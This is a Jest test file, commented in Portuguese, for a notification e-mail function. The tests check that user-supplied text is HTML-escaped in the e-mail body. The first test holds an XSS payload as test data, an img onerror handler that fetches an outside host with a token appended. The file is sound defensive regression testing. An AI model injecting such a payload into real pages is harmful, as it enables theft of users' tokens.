// O e-mail de notificação leva texto digitado por gente (nome de equipe, de rodízio...). No HTML ele vai SEMPRE escapado:
// antes da revisão da v7.5 a mensagem entrava crua em <p>${mensagem}</p> e um nome com HTML virava HTML no e-mail da vítima.
const mockBeginSend = jest.fn(async () => ({ pollUntilDone: async () => ({}) }));
jest.mock("@azure/communication-email", () => ({ EmailClient: jest.fn().mockImplementation(() => ({ beginSend: mockBeginSend })) }));
process.env.ACS_CONNECTION_STRING = "endpoint=https://exemplo.invalid/;accesskey=teste";

const { enviarEmailNotificacao } = require("../notificacaoEmail");

beforeEach(() => mockBeginSend.mockClear());

test("o HTML do e-mail escapa o texto; o texto simples segue como veio", async () => {
  const ataque = 'Você foi escalado no rodízio “<img src=x onerror=fetch("//a.co/"+token)>” & <b>outro</b>\nsegunda linha';
  expect(await enviarEmailNotificacao({ email: "fulano@exemplo.org", titulo: "Aviso", mensagem: ataque })).toBe(true);
  const { content } = mockBeginSend.mock.calls[0][0];
  expect(content.plainText).toBe(ataque);
  expect(content.html).not.toMatch(/<img|<b>|onerror=fetch\("/);
  expect(content.html).toContain("&lt;img src=x onerror=fetch(&quot;//a.co/&quot;+token)&gt;");
  expect(content.html).toContain("&amp; &lt;b&gt;outro&lt;/b&gt;");
  expect(content.html).toBe(`<p>${content.html.slice(3, -4)}</p>`);        // continua um parágrafo só
  expect(content.html).toContain("<br>segunda linha");                      // a quebra de linha continua virando <br>
});

test("aspas simples e & também são escapados; mensagem sem HTML não muda de sentido", async () => {
  await enviarEmailNotificacao({ email: "fulano@exemplo.org", titulo: "t", mensagem: "Tom & Jerry's \"casa\"" });
  expect(mockBeginSend.mock.calls[0][0].content.html).toBe("<p>Tom &amp; Jerry&#39;s &quot;casa&quot;</p>");
});

test("sem e-mail do destinatário, nada é enviado", async () => {
  expect(await enviarEmailNotificacao({ email: null, titulo: "t", mensagem: "m" })).toBe(false);
  expect(mockBeginSend).not.toHaveBeenCalled();
});
